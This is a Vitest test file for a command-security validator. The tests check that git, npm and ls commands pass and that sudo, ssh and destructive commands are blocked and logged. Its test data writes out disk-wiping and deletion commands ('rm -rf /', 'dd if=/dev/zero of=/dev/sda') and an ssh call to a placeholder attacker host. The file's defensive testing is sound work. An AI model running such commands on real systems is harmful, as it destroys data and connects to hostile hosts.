import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  validateCommand,
  parseCommand,
  getCommandSecurityLevel,
  logCommandSecurityEvent,
  type SecurityLogger,
} from './command-security';
import { CommandSecurityLevel } from './types';

describe('command-security-unit-test', () => {
  let mockLogger: SecurityLogger;

  beforeEach(() => {
    vi.clearAllMocks();
    mockLogger = {
      warn: vi.fn(),
      info: vi.fn(),
    };
  });

  it('tests that validateCommand rejects empty command', () => {
    const result = validateCommand('', [], undefined, mockLogger);

    expect(result.isValid).toBe(false);
    expect(result.error).toContain('required');
  });

  it('tests that validateCommand blocks dangerous sudo command', () => {
    const result = validateCommand('sudo apt-get install something', [], undefined, mockLogger);

    expect(result.isValid).toBe(false);
    expect(result.error).toContain('blocked');
    expect(mockLogger.warn).toHaveBeenCalledWith(
      'Blocked dangerous command',
      expect.objectContaining({ command: 'sudo' })
    );
  });

  it('tests that validateCommand allows safe commands', () => {
    const result = validateCommand('ls -la', [], undefined, mockLogger);

    expect(result.isValid).toBe(true);
    expect(result.error).toBeUndefined();
    expect(mockLogger.info).toHaveBeenCalledWith(
      'Command validated successfully',
      expect.any(Object)
    );
  });

  it('tests that validateCommand blocks rm -rf /', () => {
    const result = validateCommand('rm -rf /', [], undefined, mockLogger);

    expect(result.isValid).toBe(false);
    expect(result.error).toContain('dangerous pattern');
    expect(mockLogger.warn).toHaveBeenCalledWith(
      'Blocked dangerous command pattern',
      expect.any(Object)
    );
  });

  it('tests that validateCommand allows npm install', () => {
    const result = validateCommand('npm install', [], undefined, mockLogger);

    expect(result.isValid).toBe(true);
  });

  it('tests that parseCommand extracts command and args correctly', () => {
    const result = parseCommand('git commit -m "test message"');

    expect(result.command).toBe('git');
    expect(result.args).toContain('commit');
    expect(result.args).toContain('-m');
    // Note: Simple split doesn't handle quotes, so "test and message" will be separate
    expect(result.args.length).toBeGreaterThan(0);
  });

  it('tests that parseCommand handles single command', () => {
    const result = parseCommand('ls');

    expect(result.command).toBe('ls');
    expect(result.args).toHaveLength(0);
  });

  it('tests that getCommandSecurityLevel returns correct levels', () => {
    // Blocked command (just the command name)
    const blockedLevel = getCommandSecurityLevel('sudo');
    expect(blockedLevel).toBe(CommandSecurityLevel.BLOCKED);

    // Safe command
    const safeLevel = getCommandSecurityLevel('echo');
    expect(safeLevel).toBe(CommandSecurityLevel.SAFE);

    // Git command (typically safe)
    const gitLevel = getCommandSecurityLevel('git');
    expect(gitLevel).toBe(CommandSecurityLevel.SAFE);
  });

  it('tests that logCommandSecurityEvent calls logger with correct info', () => {
    logCommandSecurityEvent(
      'test-event',
      { level: CommandSecurityLevel.SAFE },
      mockLogger
    );

    expect(mockLogger.warn).toHaveBeenCalledWith(
      'test-event',
      expect.objectContaining({ timestamp: expect.any(String) })
    );
  });

  it('tests that blocked commands trigger warning log', () => {
    const result = validateCommand('ssh user@host', [], undefined, mockLogger);

    expect(result.isValid).toBe(false);
    expect(mockLogger.warn).toHaveBeenCalledWith(
      'Blocked dangerous command',
      expect.objectContaining({ command: 'ssh' })
    );
  });

  it('tests that validateCommand handles command with path correctly', () => {
    const result = validateCommand('/usr/bin/git status', [], undefined, mockLogger);

    // Should extract 'git' from path and allow it
    expect(result.isValid).toBe(true);
  });

  it('tests that working directory is validated if provided', () => {
    // This should work fine with a relative path
    const result = validateCommand('ls', [], './src', mockLogger);

    expect(result.isValid).toBe(true);
  });
});

describe('command-security-integration-test', () => {
  it('should validate a sequence of real-world commands', () => {
    const commands = [
      'git status',
      'npm install',
      'npm run build',
      'npm test',
      'git add .',
      'git commit -m "test"',
    ];

    const results = commands.map((cmd) => validateCommand(cmd));

    // All should be valid
    expect(results.every((r) => r.isValid)).toBe(true);
  });

  it('should block a sequence of dangerous commands', () => {
    const dangerousCommands = [
      'sudo rm -rf /',
      'ssh attacker@evil.com',
      'dd if=/dev/zero of=/dev/sda',
    ];

    const results = dangerousCommands.map((cmd) => validateCommand(cmd));

    // All should be blocked
    expect(results.every((r) => !r.isValid)).toBe(true);
  });
});
